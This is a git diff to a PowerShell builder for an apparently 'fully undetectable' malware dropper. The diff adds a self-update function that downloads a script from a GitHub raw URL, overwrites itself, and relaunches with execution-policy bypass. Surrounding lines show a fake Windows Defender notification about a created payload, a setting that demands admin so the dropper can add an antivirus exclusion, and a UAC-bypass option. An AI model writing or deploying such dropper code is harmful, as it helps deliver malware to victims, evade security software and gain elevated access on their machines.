@@ -15,6 +15,8 @@ if ($image -eq '/?') {
     break
 }
 
+$Version = "1.0"
+
 Add-Type -AssemblyName PresentationFramework
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -Name Window -Namespace Console -MemberDefinition '
@@ -540,6 +542,26 @@ function Invoke-BuildNoUI {
     Write-Host "Done!"
     Show-Notification "Windows Defender" "Payload created in $working_dir\output lmao u prolly thought this was a virus warning (skull emoji)"
 }
+
+function Update-Code {
+    param(
+        [Parameter(Mandatory=$true)]
+        [string]$Version
+    )
+    if ($Version -eq "1.0") {
+        $repo = "https://raw.githubusercontent.com/KDot227/FUD_EXE_DROPPER_2/main/builder.ps1"
+        $path = $PSCommandPath
+        $webclient = New-Object System.Net.WebClient
+        $webclient.DownloadFile($repo, $path)
+        Write-Host "Updated!" -ForegroundColor Green
+        Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File $path"
+        exit
+    } else {
+        Write-Host "No update available" -ForegroundColor Green
+    }
+}
+
+Update-Code -Version "1.0"
 
 $uac_required = $true #This makes it so when they run the bat or ps1 file it requires them to run as admin. This is important because runtime the dropper sometimes won't be fud but this will add it as a exclusion.
 $uac_BYPASS = $false #If this is true then the generated script will try and bypass uac admin. If it is false then it will just require admin if $uac_required is true otherwise it will use normal script.
